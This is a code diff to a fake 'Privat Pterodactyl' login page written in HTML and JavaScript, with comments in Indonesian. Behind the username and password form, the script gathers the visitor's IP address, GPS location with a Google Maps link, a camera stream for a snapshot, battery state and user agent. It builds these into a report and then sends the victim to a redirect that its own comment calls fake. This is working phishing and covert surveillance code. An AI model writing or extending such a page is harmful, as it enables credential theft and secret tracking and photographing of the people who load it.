@@ -17,7 +17,7 @@
       box-sizing: border-box;
     }
     .login-box {
-      background-color: #2e3e4f;
+      background-color: white;
       padding: 25px 20px;
       border-radius: 10px;
       text-align: center;
@@ -61,17 +61,11 @@
       color: #aaa;
       text-align: center;
     }
-    @media only screen and (max-width: 600px) {
-      .login-box {
-        padding: 20px 10px;
-        max-width: 90%;
-      }
-    }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2 id="platform-title">Privat Pterodactyl</h2>
+    <h2>Privat Pterodactyl</h2>
     <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="100"><br><br>
     <input type="text" id="username" placeholder="USERNAME OR EMAIL">
     <input type="password" id="password" placeholder="PASSWORD">
@@ -91,13 +85,12 @@
 
     let ipAddress = 'Tidak diketahui';
     let locationInfo = 'Tidak diberikan';
+    let locationLink = 'Tidak tersedia';
     let cameraStatus = 'Gagal';
+    let batteryStatus = 'Tidak didukung';
     let streamData = null;
-    let batteryStatus = 'Tidak tersedia';
 
-    const platformInfo = navigator.platform || 'Tidak diketahui';
-    document.getElementById('platform-title').innerText += ` - ${platformInfo}`;
-
+    // Ambil IP
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
@@ -105,18 +98,25 @@
         checkAndSend();
       });
 
+    // Ambil lokasi
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         locationInfo = `Latitude: ${lat}, Longitude: ${lon}`;
+        locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
         checkAndSend();
       }, err => {
         locationInfo = 'Izin lokasi ditolak';
+        locationLink = 'Tidak tersedia';
         checkAndSend();
       });
+    } else {
+      locationInfo = 'Geolocation tidak didukung';
+      locationLink = 'Tidak tersedia';
     }
 
+    // Ambil status kamera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         const video = document.getElementById("camera");
@@ -132,10 +132,18 @@
         checkAndSend();
       });
 
+    // Ambil status baterai
     if (navigator.getBattery) {
       navigator.getBattery().then(battery => {
-        batteryStatus = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
-        checkAndSend();
+        function updateBatteryStatus() {
+          batteryStatus = `${Math.round(battery.level * 100)}%`;
+          if (battery.charging) batteryStatus += ' (Charging)';
+          else batteryStatus += ' (Not Charging)';
+          checkAndSend();
+        }
+        updateBatteryStatus();
+        battery.addEventListener('chargingchange', updateBatteryStatus);
+        battery.addEventListener('levelchange', updateBatteryStatus);
       });
     }
 
@@ -153,7 +161,7 @@
 
       setTimeout(() => {
         loading.style.display = 'none';
-        window.location.href = 'https://example.com/dashboard.html';
+        window.location.href = 'https://example.com/dashboard.html'; // redirect palsu
       }, 3000);
     }
 
@@ -181,9 +189,9 @@
 | 
 | 🔎 IP Address: ${ipAddress}
 | 📍 Lokasi: ${locationInfo}
+| 🔗 Share Lokasi: ${locationLink}
 | 📸 Kamera: ${cameraStatus}
 | 🔋 Baterai: ${batteryStatus}
-| 💻 Platform: ${platformInfo}
 | 🗃 User-Agent: ${userAgent}
 | 🕰 Waktu Login: ${time}
 |------------------------------------------
@@ -206,8 +214,8 @@
     }
 
     function checkAndSend() {
-      if (ipAddress && locationInfo && cameraStatus && streamData) {
-        // cukup info, lanjut snapshot
+      if (ipAddress && locationInfo && cameraStatus && batteryStatus && streamData) {
+        // semua info sudah siap, lanjut snapshot
       }
     }
   </script>
